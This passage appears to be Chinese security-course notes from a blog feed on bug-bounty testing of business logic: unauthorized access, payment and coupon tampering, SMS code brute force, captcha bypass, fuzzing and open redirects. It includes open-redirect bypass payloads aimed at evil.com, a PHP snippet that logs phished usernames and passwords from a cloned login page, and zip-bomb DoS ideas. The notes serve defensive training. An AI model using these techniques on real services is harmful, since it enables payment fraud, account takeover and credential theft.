提交记录有填坑</li><li>管理员用户 admin:admin123</li><li>使用需要配置 bp 插件或者浏览器插件，直接看 GitHub 配置就行</li></ul></li><li><p>GitHub 地址：<a href="https://github.com/y1nglamore/IDOR_detect_tool">https://github.com/y1nglamore/IDOR_detect_tool</a></p><ul><li>小迪没演示这个，不过说效果也一般</li></ul></li></ul><p>‍</p><p>‍</p><h2 id="实战SRC挖掘"><a href="#实战SRC挖掘" class="headerlink" title="实战SRC挖掘"></a>实战SRC挖掘</h2><p><a href="assets/%E7%AC%AC72-1%E5%A4%A9%EF%BC%9A%E5%AE%9E%E6%88%98SRC%E8%B6%8A%E6%9D%83%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8C%96%E6%8E%98%E5%88%86%E4%BA%AB%E6%A1%88%E4%BE%8B-20240908191601-0y8f45x.pdf">实战SRC越权未授权挖掘分享案例.pdf</a></p><ol><li>找到当前用户相关的参数名，添加返回包里面的参数名参数值去提交，</li><li>参数值请求数据加密：JS 中找逆向算法，还原算法重新修改发包测试</li><li>请求包带 token：直接复用和删除测试。</li></ol><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h1 id="支付逻辑"><a href="#支付逻辑" class="headerlink" title="支付逻辑"></a>支付逻辑</h1><p><img src="/assets/image-20240908171643-yt9f0k8.png" alt="image">​</p><p>‍</p><h2 id="常见测试"><a href="#常见测试" class="headerlink" title="常见测试"></a>常见测试</h2><blockquote><p>1、熟悉常见支付流程<br>选择商品和数量-选择支付及配送方式-生成订单编号-订单支付选择-完成支付<br>2、熟悉那些数据篡改<br>商品ID，购买价格，购买数量，订单属性，折扣属性，支付方式，支付状态等<br>3、熟悉那些修改方式<br>替换支付，重复支付，最小额支付，负数支付，溢出支付，优惠券支付等<br>4、熟悉那些另类方法<br>无限试用，越权支付，并发兑换，四舍五入半价购，循环利用优惠券，支付签约逻辑等</p></blockquote><p>‍</p><h2 id="挖掘思路"><a href="#挖掘思路" class="headerlink" title="挖掘思路"></a>挖掘思路</h2><blockquote><p>1、找到关键的数据包<br>可能一个支付操作有三四个数据包，我们要对数据包进行挑选。<br>2、分析数据包<br>支付数据包中会包含很多的敏感信息（账号，金额，余额，优惠等）<br>要尝试对数据包中的各个参数进行分析。<br>3、不按套路出牌<br>多去想想开发者没有想到的地方，如算法拼接，关闭开启返优惠券等<br>4、PC端尝试过，APP端也看看，小程序也试试</p></blockquote><p>‍</p><h2 id="修复思路"><a href="#修复思路" class="headerlink" title="修复思路"></a>修复思路</h2><blockquote><p>1、在后端检查订单的每一个值，包括支付状态；<br>2、校验价格、数量参数，比如产品数量只能为整数，并限制最大购买数量 ；<br>3、与第三方支付平台检查，实际支付的金额是否与订单金额一致；<br>4、如给用户退款，要使用原路、原订单退回。如：退押金，按用户原支付订单原路退回；<br>5、加密、解密、数字签名及验证，这个可以有效避免数据修改，重放攻击中的各种问题；<br>6、金额超过指定值，进行人工审核等。</p></blockquote><p>‍</p><h2 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例"></a>演示案例</h2><h3 id="修改购买数量"><a href="#修改购买数量" class="headerlink" title="修改购买数量"></a>修改购买数量</h3><p><img src="/assets/image-20240908173031-lbhmagt.png" alt="image">​</p><h3 id="篡改价格"><a href="#篡改价格" class="headerlink" title="篡改价格"></a>篡改价格</h3><p><img src="/assets/image-20240908173056-jxr631k.png" alt="image">​</p><h3 id="产品订单对冲"><a href="#产品订单对冲" class="headerlink" title="产品订单对冲"></a>产品订单对冲</h3><p>就是购买时抓包</p><ul><li><p>含义：</p><ul><li><p>以 A 产品的价格订单去购买 B 产品的订单价格</p></li><li><p>对方只检测付款成功的状态，不考虑对应订单的产品，就会有这样的安全问题</p><p><img src="/assets/image-20240908173653-yt4getc.png" alt="image">​</p></li></ul></li><li><p>感觉有点像就是修改订单数据包，只是这个不是自己随便修改，而是参照另一个商品订单进行修改</p><p><img src="/assets/image-20240908173725-23mpxmw.png" alt="image">​</p><p><img src="/assets/image-20240908173813-jp373mb.png" alt="image">​</p></li></ul><p>‍</p><h3 id="替换支付"><a href="#替换支付" class="headerlink" title="替换支付"></a>替换支付</h3><p>付款时抓包</p><p><img src="/assets/image-20240908173956-siwtwpl.png" alt="image">​</p><p>‍</p><p>‍</p><h3 id="优惠券复用盗用"><a href="#优惠券复用盗用" class="headerlink" title="优惠券复用盗用"></a>优惠券复用盗用</h3><ul><li><p>复用：购买商品抓包进行分析，领取优惠券后，第一个订单不使用优惠券下单，第二个使用，对比分析数据不同</p><p><img src="/assets/image-20240908174527-jmf4nfh.png" alt="image">​</p><p>注意！！此时两个订单都没有支付</p><p><img src="/assets/image-20240908174727-tsy44df.png" alt="image">​</p><p>此时第三次购买商品，并修改数据包把<code>use_coupon=0</code>​改为<code>use_coupon=4</code>​</p><p><img src="/assets/image-20240908174757-tw2hnts.png" alt="image">​</p><p><img src="/assets/image-20240908174822-o77u1nd.png" alt="image">​</p></li><li><p>盗用：算出优惠券规律，如你的优惠券 id 为 1，则别人的可能为 2,3,4,5……</p><p>也可能是加密的值，逆向这个算法，自己修改为可用的优惠券编号</p><p><img src="/assets/image-20240908174641-9ue24to.png" alt="image">​</p></li></ul><p>‍</p><h3 id="积分对冲溢出"><a href="#积分对冲溢出" class="headerlink" title="积分对冲溢出"></a>积分对冲溢出</h3><p><img src="/assets/image-20240908174901-gwafojc.png" alt="image">​</p><p><img src="/assets/image-20240908180649-rlv8k21.png" alt="image">​</p><p><img src="/assets/image-20240908185708-lu9zdwd.png" alt="image">​</p><p><img src="/assets/image-20240908185753-751vo7a.png" alt="image">​</p><p><img src="/assets/image-20240908190229-mrsd8r9.png" alt="image">​</p><p><img src="/assets/image-20240908190214-hm2tnaw.png" alt="image">​</p><p><img src="/assets/image-20240908190328-gm4cqfy.png" alt="image">​</p><p>‍</p><p>‍</p><h2 id="SRC挖掘"><a href="#SRC挖掘" class="headerlink" title="SRC挖掘"></a>SRC挖掘</h2><p><a href="https://forum.butian.net/share/1125">奇安信攻防社区-一次信息泄露到越权支付的实战 (butian.net)</a></p><p><a href="assets/%E5%AE%9E%E6%88%98SRC%E6%94%AF%E4%BB%98%E8%B4%AD%E4%B9%B0%E6%8C%96%E6%8E%98%E5%88%86%E4%BA%AB%E6%A1%88%E4%BE%8B-20240908191447-4gif5dn.docx">实战SRC支付购买挖掘分享案例.docx</a></p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h1 id="机制验证"><a href="#机制验证" class="headerlink" title="机制验证"></a>机制验证</h1><p><img src="/assets/image-20240909170510-5mi8adj.png" alt="image">​</p><p><img src="/assets/image-20240909170515-nfoslt4.png" alt="image">​</p><p>‍</p><h2 id="验证码回传"><a href="#验证码回传" class="headerlink" title="验证码回传"></a>验证码回传</h2><p>通过手机找回密码，响应包中包含短信验证码。</p><p><img src="/assets/image-20240909170823-v8umccr.png" alt="image">​</p><p><img src="/assets/image-20240909170842-iuvoh61.png" alt="image">​</p><p><img src="/assets/image-20240909170858-q7r59wn.png" alt="image">​</p><p>‍</p><h2 id="枚举爆破"><a href="#枚举爆破" class="headerlink" title="枚举爆破"></a>枚举爆破</h2><p>找回密码时使用位数较少的短信验证码，或者<strong>验证码没有设置有效时间限制</strong>，导致攻击者借助自动化工具在一定时间范围内爆破获得短信验证码，从而导致重置任意账号密码。</p><p><img src="/assets/image-20240909170956-ntc4u0j.png" alt="image">​</p><p><img src="/assets/image-20240909171007-ap4xnlq.png" alt="image">​</p><p>该APP实际上是发送6位验证码，但是并没有时间限制</p><p><img src="/assets/image-20240909171031-wrjzz76.png" alt="image">​</p><p><img src="/assets/image-20240909171050-tk5z8kt.png" alt="image">​</p><p>‍</p><p>‍</p><h2 id="重定向发送"><a href="#重定向发送" class="headerlink" title="重定向发送"></a>重定向发送</h2><h3 id="重定向用户"><a href="#重定向用户" class="headerlink" title="重定向用户"></a>重定向用户</h3><p><img src="/assets/image-20240909180022-4ywmo6a.png" alt="image">​</p><p><img src="/assets/image-20240909180034-4ijyf2w.png" alt="image">​</p><p><img src="/assets/image-20240909180607-v0e1kfc.png" alt="image">​</p><p><img src="/assets/image-20240909180626-46fpxvm.png" alt="image">​</p><p><img src="/assets/image-20240909180915-klinhfw.png" alt="image">​</p><p><img src="/assets/image-20240909180928-k8ja2xy.png" alt="image">​</p><p>‍</p><h3 id="重定向数据包"><a href="#重定向数据包" class="headerlink" title="重定向数据包"></a>重定向数据包</h3><p>如果数据包存在发送验证邮箱或目标地址，尝试修改到自己接受地，实现拦截获取</p><p><img src="/assets/image-20240909181321-fu89lrp.png" alt="image">​</p><p><img src="/assets/image-20240909181354-h1rmd0z.png" alt="image">​</p><p><img src="/assets/image-20240909181407-9xtdcve.png" alt="image">​</p><p><img src="/assets/image-20240909182050-oyxj7ok.png" alt="image">​</p><p><img src="/assets/image-20240909182311-23u5ajw.png" alt="image">​</p><p>‍</p><h2 id="响应状态码"><a href="#响应状态码" class="headerlink" title="响应状态码"></a>响应状态码</h2><p><img src="/assets/image-20240909182416-f2wp1y1.png" alt="image">​</p><p><img src="/assets/image-20240909182442-gu2m0zx.png" alt="image">​</p><p><img src="/assets/image-20240909182501-otmycvg.png" alt="image">​</p><p>以此类推</p><p>‍</p><p>‍</p><h2 id="跳过步骤"><a href="#跳过步骤" class="headerlink" title="跳过步骤"></a>跳过步骤</h2><p>找回密码流程一般需要四个步骤：<br>流程：验证用户名-验证短信验证码-输入新密码-重置成功</p><p>这四个步骤应该紧紧相连，互相相关，只有通过了第一个步骤验证才可以进入下一个步骤，如果每个步骤之间没有进行关联性验证，就可能导致跳过关键验证步骤，从而导致重置任意账号密码。</p><p>‍</p><p>‍</p><h2 id="SRC挖掘-1"><a href="#SRC挖掘-1" class="headerlink" title="SRC挖掘"></a>SRC挖掘</h2><p><a href="assets/%E7%AC%AC74-1%E5%A4%A9%EF%BC%9A%E5%AE%9E%E6%88%98SRC%E9%AA%8C%E8%AF%81%E9%80%BB%E8%BE%91%E6%8C%96%E6%8E%98%E5%88%86%E4%BA%AB%E6%A1%88%E4%BE%8B-20240909182900-2rtctco.pdf">实战SRC验证逻辑挖掘分享案例.pdf</a></p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h1 id="验证码安全"><a href="#验证码安全" class="headerlink" title="验证码安全"></a>验证码安全</h1><p>‍</p><h2 id="图片验证码识别"><a href="#图片验证码识别" class="headerlink" title="图片验证码识别"></a>图片验证码识别</h2><p>白嫖版插件地址：<a href="https://github.com/smxiazi/NEW_xp_CAPTCHA">https://github.com/smxiazi/NEW_xp_CAPTCHA</a></p><ol><li><p>Burp 加载插件</p><ul><li>直接在插件里面加载 xp_CAPTCHA_v2.2.jdk.8.jar 或者 xp_CAPTCHA_v2.2.jdk.16.jar</li></ul></li><li><p>运行监听 py 文件</p><ul><li><p>在插件目录下的 NEW_xp_CAPTCHA 目录中，直接运行那个运行.bat 即可</p><p>然后访问插件给出的地址127.0.0.1:8899</p></li><li><p>没有 server 文件的可以直接在上面 github 地址里面下载，里面有</p></li><li><p>有个坑就是电脑名字不能是汉字的，不然会报错，py 文件里面有个地方获取计算机名</p></li></ul></li><li><p>设置插件 - 验证码地址</p><ul><li><p>在插件设置中进行设置</p><p><img src="/assets/image-20240911171835-0m3fhic.png" alt="image">​</p></li></ul></li><li><p>数据包验证码填入参数，根据插件你选择的验证码编号</p><p> <img src="/assets/image-20240911171934-xwurmmh.png" alt="image">​</p><p> <img src="/assets/image-20240911172022-qvejlxi.png" alt="image">​</p></li><li><p>发包线程设置 1 后开始</p><p> 新版</p><p> <img src="/assets/image-20240911172043-envzb2y.png" alt="image">​</p><p> 老版</p><p> <img src="/assets/image-20240911172338-c698nhg.png" alt="image">​</p></li><li><p>执行爆破</p><p> <img src="/assets/image-20240911172817-up49vwk.png" alt="image">​</p></li></ol><p>‍</p><p>‍</p><h2 id="接口枚举-短信轰炸"><a href="#接口枚举-短信轰炸" class="headerlink" title="接口枚举-短信轰炸"></a>接口枚举-短信轰炸</h2><p><img src="/assets/image-20240911173503-er5lk4b.png" alt="image">​</p><p><img src="/assets/image-20240911173521-voxys2c.png" alt="image">​</p><p><img src="/assets/image-20240911173534-8jzn8np.png" alt="image">​</p><p>‍</p><p>‍</p><p>‍</p><h2 id="重复使用-接口滥用"><a href="#重复使用-接口滥用" class="headerlink" title="重复使用-接口滥用"></a>重复使用-接口滥用</h2><p><img src="/assets/image-20240911173720-axpwnip.png" alt="image">​</p><ul><li><p>删除验证码字段进行绕过或直接使用</p></li><li><p>Token sign 验证码等直接重复使用测试</p><ul><li>或者将其删掉进行测试</li></ul><p><img src="/assets/image-20240911173742-eq4eonf.png" alt="image">​</p><p><img src="/assets/image-20240911173753-q1hm0hk.png" alt="image">​</p><p><img src="/assets/image-20240911173803-f6lvo3m.png" alt="image">​</p></li></ul><p>‍</p><p>‍</p><p>‍</p><h2 id="滑块验证码-宏命令"><a href="#滑块验证码-宏命令" class="headerlink" title="滑块验证码-宏命令"></a>滑块验证码-宏命令</h2><p>参考：<a href="https://blog.csdn.net/shuryuu/article/details/104576559">https://blog.csdn.net/shuryuu/article/details/104576559</a></p><p>如果看不太懂或者觉得很麻烦，可以参考下面这个文章，原理都是一样的(都是从响应包提取数据放到请求包里)</p><p>token防爆破?<br><a href="https://blog.csdn.net/m0_60571842/article/details/133898472">https://blog.csdn.net/m0_60571842/article/details/133898472</a></p><p>同理也可以适用在Token，sign在响应页面中自动获取自动填入请求数据包后绕过验证</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h1 id="Fuzz模糊测试篇"><a href="#Fuzz模糊测试篇" class="headerlink" title="Fuzz模糊测试篇"></a>Fuzz模糊测试篇</h1><p>是一种基于黑盒的自动化软件模糊测试技术,简单的说一种懒惰且暴力的技术融合了常见的以及精心构建的数据文本进行网站、软件安全性测试。</p><p>‍</p><h2 id="Fuzz-应用场景"><a href="#Fuzz-应用场景" class="headerlink" title="Fuzz 应用场景"></a>Fuzz 应用场景</h2><ul><li>爆破用户口令</li><li>爆破敏感目录</li><li>爆破文件地址</li><li>爆破未知参数名</li><li>Payload 测漏洞（绕过等也可以用）</li></ul><p>‍</p><h2 id="弱口令–JS算法逆向"><a href="#弱口令–JS算法逆向" class="headerlink" title="弱口令–JS算法逆向"></a>弱口令–JS算法逆向</h2><h3 id="burp插件-1"><a href="#burp插件-1" class="headerlink" title="burp插件"></a>burp插件</h3><p>‍</p><h4 id="jsEncrypter"><a href="#jsEncrypter" class="headerlink" title="jsEncrypter"></a>jsEncrypter</h4><p>GitHub 下载地址：<a href="https://github.com/c0ny1/jsEncrypter">https://github.com/c0ny1/jsEncrypter</a></p><ul><li><p>使用方法如下</p><ol><li><p>下载phantomjs并设置环境变量</p><p> 下载链接：<a href="https://phantomjs.org/download.html">https://phantomjs.org/download.html</a></p></li><li><p>打开cmd输入phantomjs若如图显示则表示环境变量设置成功</p><p> <img src="/assets/image-20240903165235-21w0m7u.png" alt="image-20240903165235-21w0m7u">​</p></li><li><p>BurpSuite加载jsEncrypter插件</p><p> 插件下载地址：<a href="https://github.com/c0ny1/jsEncrypter/releases">https://github.com/c0ny1/jsEncrypter/releases</a></p><p> <img src="/assets/image-20240903165445-cwu6n4k.png" alt="image-20240903165445-cwu6n4k">​</p><p> <img src="/assets/image-20240903165505-b5xrelv.png" alt="image-20240903165505-b5xrelv">​</p><p> <img src="/assets/image-20240903165526-63jqdur.png" alt="image-20240903165526-63jqdur">​</p></li><li><p>对逆向的加密算法提取JS文件及代码</p><p> <img src="/assets/image-20240903165731-h5tartu.png" alt="image-20240903165731-h5tartu">​</p></li><li><p>将加密算法文件保存到相同目录下</p><p> <img src="/assets/image-20240903165834-el1gu6v.png" alt="image-20240903165834-el1gu6v">​</p><p> <img src="/assets/image-20240903165904-hldp0sa.png" alt="image-20240903165904-hldp0sa">​</p></li><li><p>修改phantomjs_server.js文件配置</p><p> <img src="/assets/image-20240903170150-3z16k5x.png" alt="image-20240903170150-3z16k5x">​</p></li><li><p>在当前文件夹执行命令<code>phantomjs phantomjs_server.js</code>​</p><p> <img src="/assets/image-20240903170257-wffu2l1.png" alt="image-20240903170257-wffu2l1">​</p><p> <img src="/assets/image-20240903170317-ut8lm0l.png" alt="image-20240903170317-ut8lm0l">​</p></li><li><p>发包测试时也要注意引用插件选项</p><p> <img src="/assets/image-20240903170402-kucg7gj.png" alt="image-20240903170402-kucg7gj">​</p><p> <img src="/assets/image-20240903170417-6ljswb4.png" alt="image-20240903170417-6ljswb4">​</p><p> <img src="/assets/image-20240903170435-ofrv61j.png" alt="image-20240903170435-ofrv61j">​</p></li><li><p>发包内容被成功加密</p><p> <img src="/assets/image-20240903170542-oibe7r9.png" alt="image-20240903170542-oibe7r9">​</p></li></ol></li></ul><p>‍</p><h4 id="BurpCrypto"><a href="#BurpCrypto" class="headerlink" title="BurpCrypto"></a>BurpCrypto</h4><p>GitHub 下载地址：<a href="https://github.com/whwlsfb/BurpCrypto">https://github.com/whwlsfb/BurpCrypto</a></p><p>‍</p><h2 id="爆破点-目录，文件名，参数，参数值，提交格式。。。。。"><a href="#爆破点-目录，文件名，参数，参数值，提交格式。。。。。" class="headerlink" title="爆破点-目录，文件名，参数，参数值，提交格式。。。。。"></a>爆破点-目录，文件名，参数，参数值，提交格式。。。。。</h2><p><strong>重点在于返回值不一样</strong></p><p>假设目标网站有这样一个路径：<a href="http://xxx.xxx.xxx.xxx/admin/ping.php?do%5C=1">http://xxx.xxx.xxx.xxx/admin/ping.php?do\=1</a></p><ul><li><p>通过 Fuzz 爆破出来了这个路径文件，目录 &#x2F;admin，文件 ping.php</p><ul><li>直接访问页面返回一个 error</li></ul></li><li><p>但是找漏洞需要构造参数和参数值，但我们不知道参数名称和参数值</p></li><li><p>所以修改数据包将访问路径修改为 &#x2F;admin&#x2F;ping.php?a=1，然后对 a 进行爆破，这个 1 是瞎写的，是什么都可以</p><ul><li>即盲猜参数名</li><li>do 返回长度不同，其他都会返回 error，但是 do 返回没有 error，所以存在 do 参数名</li></ul></li><li><p>然后就使用字典再去爆破参数值，因为这里猜测是 rce，所以使用 rce 的字典去跑这个参数值</p><ul><li>成功得出结果</li></ul></li></ul><p>‍</p><p>字典在文件夹</p><p>‍</p><p>‍</p><h2 id="SRC未授权案例"><a href="#SRC未授权案例" class="headerlink" title="SRC未授权案例"></a>SRC未授权案例</h2><p><a href="assets/%E7%AC%AC76-1%E5%A4%A9%EF%BC%9AFuzz%E6%8A%80%E6%9C%AFSRC%E6%B3%84%E6%BC%8F%E6%9C%AA%E6%8E%88%E6%9D%83%E6%A1%88%E4%BE%8B%E6%8C%96%E6%8E%98-20240921164152-4i165y1.pdf">Fuzz技术SRC泄漏未授权案例挖掘.pdf</a></p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h1 id="隐私合规检测"><a href="#隐私合规检测" class="headerlink" title="隐私合规检测"></a>隐私合规检测</h1><p>‍</p><h2 id="检测项目-1"><a href="#检测项目-1" class="headerlink" title="检测项目"></a>检测项目</h2><ul><li><p>主要针对小程序 (小程序可能需要逆向) 和 APP</p></li><li><p>对象：APP 小程序等，测试时即可测试目标的 app 或者小程序是否隐私合规</p></li><li><p>例如检测目标是否在偷偷监听、录音、获取信息等</p></li><li><p>具体：后续 APP 安全课程</p><ul><li><p>appscan 官网：<a href="https://appscan.ly.com/">https://appscan.ly.com/</a></p><ul><li>推荐这个，这个是动态分析</li><li>不过需要 root 安卓手机并且打开 ADB 调试</li></ul></li><li><p>appshark 的 GitHub 地址：<a href="https://github.com/bytedance/appshark">https://github.com/bytedance/appshark</a></p><ul><li>这个是静态分析</li></ul></li></ul></li><li><p>vivo 隐私合规漏洞评分规则 v1.0 参考：<a href="https://mp.weixin.qq.com/s/tgEZth3TFyyis_EBrQ5PhQ">https://mp.weixin.qq.com/s/tgEZth3TFyyis_EBrQ5PhQ</a></p></li><li><p>MobSF 也可以进行测试</p><ul><li><p>Windows – MobSF 安装参考：</p><ul><li><a href="https://www.cnblogs.com/B-hai/p/15696948.html">https://www.cnblogs.com/B-hai/p/15696948.html</a></li><li><a href="https://blog.csdn.net/ljh824144294/article/details/119181803">https://blog.csdn.net/ljh824144294/article/details/119181803</a></li><li>补充：自己搭建比较麻烦，容易出很多莫名问题，<a href="https://www.suyou.world/index.php/2023/08/16/%e7%ac%ac20%e5%a4%a9%ef%bc%9a%e4%bf%a1%e6%81%af%e6%89%93%e7%82%b9-%e7%ba%a2%e8%93%9d%e9%98%9f%e8%87%aa%e5%8a%a8%e5%8c%96%e9%a1%b9%e7%9b%ae%e8%b5%84%e4%ba%a7%e4%be%a6%e5%af%9f%e4%bc%81%e6%9f%a5/">第 20 天课程</a>中有一个 f8x 项目，可以自动化搭建，推荐使用这个来搭建。</li></ul></li><li><p>mobsf 分析 apk 后可以得到报告，查看报告内容</p><ul><li>可以看到该 apk 需要使用到的权限，然后看使用 apk 时是否会有提示</li></ul></li></ul></li></ul><p>‍</p><h2 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h2><p>‍</p><h3 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h3><h4 id="看业务"><a href="#看业务" class="headerlink" title="看业务"></a>看业务</h4><ul><li>用户登录、统一身份认证处，认证完后会跳转</li><li>用户分享、收藏内容过后，会跳转</li><li>跨站点认证、授权后，会跳转</li><li>站内点击其它网址链接时，会跳转</li></ul><h4 id="看参数名"><a href="#看参数名" class="headerlink" title="看参数名"></a>看参数名</h4><blockquote><p>redirect</p><p>redirect_to</p><p>redirect_url</p><p>url</p><p>jump</p><p>jump_to</p><p>target</p><p>to</p><p>link</p><p>linkto</p><p>domain</p></blockquote><p>还可以使用 google 语法搜索</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">site:<span class="hljs-title">xxx.xxx</span> <span class="hljs-title">inurl</span>:?<span class="hljs-title">url</span>=</span><br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><h3 id="白盒看代码块"><a href="#白盒看代码块" class="headerlink" title="白盒看代码块"></a>白盒看代码块</h3><ul><li><p>Java</p><ul><li>response.sendRedirect(request.getParameter(“url”))</li></ul></li><li><p>PHP:</p><ul><li>$redirect_url = $_GET[‘url’];</li><li>header(“Location: “ . $redirect_url)</li></ul></li><li><p>.NET:</p><ul><li>string redirect_url = request.QueryString[“url”];</li><li>Response.Redirect(redirect_url);</li></ul></li><li><p>Django:</p><ul><li>redirect_url = request.GET.get(“url”)</li><li>HttpResponseRedirect(redirect_url)</li></ul></li><li><p>Flask:</p><ul><li>redirect_url = request.form[‘url’]</li><li>redirect(redirect_url)</li></ul></li><li><p>Rails:</p><ul><li>redirect_to params[:url]</li></ul></li></ul><p>‍</p><h3 id="跳转-url-绕过思路"><a href="#跳转-url-绕过思路" class="headerlink" title="跳转 url 绕过思路"></a>跳转 url 绕过思路</h3><ul><li><p>单斜线 “&#x2F;“ 绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://www.landgrey.me/redirect.php?url=/www.evil.com<br></code></pre></td></tr></table></figure></li><li><p>缺少协议绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://www.landgrey.me/redirect.php?url=//www.evil.com<br></code></pre></td></tr></table></figure></li><li><p>多斜线 “&#x2F;“ 前缀绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://www.landgrey.me/redirect.php?url=///www.evil.com https://www.landgrey.me/redirect.php?url=www.evil.com<br></code></pre></td></tr></table></figure></li><li><p>利用 “@” 符号绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://www.landgrey.me/redirect.php?url=https://www.landgrey.me@www.evil.com<br></code></pre></td></tr></table></figure></li><li><p>利用反斜线 “\“ 绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://www.landgrey.me/redirect.php?url=https://www.evil.com\www.landgrey.me<br></code></pre></td></tr></table></figure></li><li><p>利用 “#” 符号绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://www.landgrey.me/redirect.php?url=https://www.evil.com#www.landgrey.me<br></code></pre></td></tr></table></figure></li><li><p>利用 “?” 号绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://www.landgrey.me/redirect.php?url=https://www.evil.com?www.landgrey.me<br></code></pre></td></tr></table></figure></li><li><p>利用 “\\“ 绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://www.landgrey.me/redirect.php?url=https://www.evil.com\\www.landgrey.me<br></code></pre></td></tr></table></figure></li><li><p>利用 “.” 绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs url">https://www.landgrey.me/redirect.php?url=.evil           <br>(可能会跳转到www.landgrey.me.evil域名) <br>https://www.landgrey.me/redirect.php?url=.evil.com       <br>(可能会跳转到evil.com域名)<br></code></pre></td></tr></table></figure></li><li><p>重复特殊字符绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs url">https://www.landgrey.me/redirect.php?url=///www.evil.com//.. <br>https://www.landgrey.me/redirect.php?url=www.evil.com//..<br></code></pre></td></tr></table></figure></li></ul><p>‍</p><p>‍</p><h2 id="钓鱼配合"><a href="#钓鱼配合" class="headerlink" title="钓鱼配合"></a>钓鱼配合</h2><p>使用 Teleport Ultra 工具将目标网站整个页面爬取下来</p><ul><li><p>下载使用可参考：<a href="https://blog.csdn.net/qq_44035882/article/details/127531747">https://blog.csdn.net/qq_44035882&#x2F;article&#x2F;details&#x2F;127531747</a></p></li><li><p>自己会用什么语言，就用什么语言写劫持代码，如这里使用 php，将原本的 login.html 修改为 login.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">在文件开头添加php代码 <br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$u</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]; <br><span class="hljs-variable">$p</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]; <br><span class="hljs-variable">$f</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;pass.txt&#x27;</span>,<span class="hljs-string">&#x27;a+&#x27;</span>); <br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$f</span>,<span class="hljs-variable">$u</span>.<span class="hljs-string">&quot;|&quot;</span>.<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;\n&quot;</span>); <br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$f</span>); <br><span class="hljs-meta">?&gt;</span> <br> <br>使用form包裹输入用户名密码的地方，将用户名密码提交到当前文件 <br>&lt;form action=<span class="hljs-string">&quot;login.php&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span>&gt; <br>提交参数名记得要和php代码中的对应 <br>&lt;/form&gt;<br></code></pre></td></tr></table></figure></li></ul><p>‍</p><p>‍</p><h2 id="资源拒绝服务"><a href="#资源拒绝服务" class="headerlink" title="资源拒绝服务"></a>资源拒绝服务</h2><ul><li><p>功能 ：网站验证码或图片可以自定义显示大小</p><ul><li>将大小设置为很大，将服务器 cpu 拉满，达到拒绝服务的目的</li></ul></li><li><p>功能 ：网站可以上传压缩包解压循环</p><ul><li>压缩包里面还是压缩包 (套娃即压缩包炸弹) 造成资源占用，达到拒绝服务的目的</li></ul></li></ul><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>业务逻辑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>业务逻辑</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>安全开发🧩</title>
    <link href="/2024/07/05/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    <url>/2024/07/05/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/</url>
    
